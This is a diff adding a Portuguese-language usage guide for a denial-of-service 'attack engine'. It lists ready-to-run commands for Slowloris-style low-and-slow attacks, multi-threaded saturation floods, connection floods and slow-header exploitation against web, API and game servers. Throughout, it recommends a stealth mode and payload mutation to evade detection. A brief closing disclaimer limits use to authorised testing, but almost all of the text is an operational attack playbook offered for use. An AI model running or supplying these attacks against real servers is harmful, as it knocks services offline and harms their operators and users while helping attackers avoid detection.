@@ -1,0 +1,123 @@
+# Exemplos de Uso da Engine de Ataque
+# Engine de Ataque de Baixo e Alto Volume
+
+## 1. Análise de Alvo
+# Analisar um alvo para determinar vulnerabilidades e melhor protocolo
+python3 main.py --mode analyze --target example.com --port 80
+
+## 2. Ataque Low-and-Slow (Slowloris)
+# Ataque de baixo volume que mantém conexões abertas
+python3 main.py --mode slow --target example.com --port 80 --duration 60 --stealth
+
+# Com mutação de payloads
+python3 main.py --mode slow --target example.com --port 80 --payload-mutation --stealth
+
+# Com IoC customizados
+python3 main.py --mode slow --target example.com --ioc --duration 30
+
+## 3. Ataque de Saturação (DDoS)
+# Ataque de alto volume com múltiplos protocolos
+python3 main.py --mode saturation --target example.com --duration 30 --threads 20
+
+# Com configurações específicas
+python3 main.py --mode saturation --target example.com --threads 50 --duration 60 --stealth
+
+## 4. Exploração de Vulnerabilidades
+# Explorar reuso de sockets TCP
+python3 main.py --mode exploit --target example.com --vulnerability tcp_reuse --duration 60
+
+# Explorar headers lentos
+python3 main.py --mode exploit --target example.com --vulnerability slow_headers --duration 45
+
+# Explorar flood de conexões
+python3 main.py --mode exploit --target example.com --vulnerability connection_flood --duration 30
+
+## 5. Modo Stealth
+# Ativar modo stealth para evitar detecção
+python3 main.py --mode slow --target example.com --stealth --duration 120
+
+# Stealth com mutação
+python3 main.py --mode saturation --target example.com --stealth --payload-mutation
+
+## 6. Geração de IoC
+# Gerar Indicadores de Compromise
+python3 main.py --mode slow --target example.com --ioc --duration 30
+
+# IoC com diferentes formatos
+python3 main.py --mode saturation --target example.com --ioc --duration 60
+
+## 7. Usando Alias (após instalação)
+# Usar o alias criado durante a instalação
+engine-attack --mode analyze --target example.com
+engine-attack --mode slow --target example.com --stealth
+engine-attack --mode saturation --target example.com --threads 30
+
+## 8. Configurações Avançadas
+# Ataque com muitas threads
+python3 main.py --mode saturation --target example.com --threads 100 --duration 60
+
+# Ataque com duração longa
+python3 main.py --mode slow --target example.com --duration 300 --stealth
+
+# Ataque com payload mutação
+python3 main.py --mode exploit --target example.com --vulnerability tcp_reuse --payload-mutation
+
+## 9. Exemplos de Alvos Comuns
+# Servidor web
+python3 main.py --mode slow --target www.example.com --port 80 --stealth
+
+# Servidor HTTPS
+python3 main.py --mode slow --target www.example.com --port 443 --stealth
+
+# API REST
+python3 main.py --mode saturation --target api.example.com --port 8080 --threads 20
+
+# Servidor de jogos
+python3 main.py --mode saturation --target game.example.com --port 25565 --threads 50
+
+## 10. Modo de Teste
+# Teste rápido (5 segundos)
+python3 main.py --mode slow --target example.com --duration 5
+
+# Teste com análise
+python3 main.py --mode analyze --target example.com
+python3 main.py --mode slow --target example.com --duration 10 --stealth
+
+## Parâmetros Disponíveis
+
+### Modos de Ataque:
+- analyze: Análise do alvo
+- slow: Ataque Low-and-Slow
+- saturation: Ataque de saturação
+- exploit: Exploração de vulnerabilidades
+
+### Vulnerabilidades:
+- tcp_reuse: Reuso de sockets TCP
+- slow_headers: Headers lentos
+- connection_flood: Flood de conexões
+
+### Opções:
+- --target: Alvo (IP ou domínio)
+- --port: Porta do alvo (padrão: 80)
+- --duration: Duração em segundos (padrão: 30)
+- --threads: Número de threads (padrão: 10)
+- --stealth: Ativar modo stealth
+- --payload-mutation: Ativar mutação de payloads
+- --ioc: Gerar IoC customizados
+
+## Dicas de Uso
+
+1. **Sempre teste primeiro**: Use --mode analyze para entender o alvo
+2. **Use stealth**: Ative --stealth para evitar detecção
+3. **Monitore logs**: Verifique logs/engine.log para detalhes
+4. **Comece pequeno**: Use poucas threads inicialmente
+5. **Respeite limites**: Não abuse da ferramenta
+
+## Aviso Legal
+
+⚠️ ESTE SOFTWARE É DESTINADO APENAS PARA:
+- Testes de penetração autorizados
+- Pesquisa em segurança
+- Educação em segurança cibernética
+
+❌ NÃO USE PARA ATIVIDADES ILEGAIS! 
